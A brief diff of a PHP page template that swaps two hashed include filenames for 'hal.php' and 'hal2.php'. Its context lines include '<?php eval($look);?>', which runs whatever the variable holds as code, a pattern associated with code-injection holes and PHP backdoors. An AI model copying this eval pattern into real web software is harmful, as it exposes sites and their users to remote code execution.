@@ -27,13 +27,13 @@
   <body>
   <div class="container main">
 
-<?php include '_1c1ae65fe9828eb6d3cee4edacf90018.php';?>
+<?php include 'hal.php';?>
 
 
 
 <div class="row">
 <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 sidebar-left">
-	<?php include '_7feb09b1cc77316e82afe633b4476000.php';?>
+	<?php include 'hal2.php';?>
 </div>
 <div class="col-xs-12 col-sm-9 col-md-9 col-lg-9 middle">
 	<?php eval($look);?>
